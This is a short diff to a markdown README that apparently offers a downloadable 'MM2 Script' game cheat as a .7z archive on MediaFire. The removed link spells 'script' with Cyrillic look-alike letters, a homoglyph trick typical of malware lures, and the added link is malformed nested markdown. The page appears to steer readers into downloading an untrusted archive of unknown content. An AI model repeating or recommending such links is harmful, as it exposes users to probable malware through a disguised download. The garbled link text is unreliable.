@@ -8,7 +8,7 @@
 
 ### 📥 Script
 
-## [Download MM2 Script](https://www.mediafire.com/file_premium/ivr409oavu026kc/mm2-s%25D1%2581ri%25D1%2580t.7z/file)
+## [Download MM2 Script]([https://www.mediafire.com/file_premium/ivr409oavu026kc/mm2-s%25D1%2581ri%25D1%2580t.7z/file](https://www.mediafire.com/file_premium/iktm1s2lokw91xz/mm2-script.7z/file))
 
 ---
 
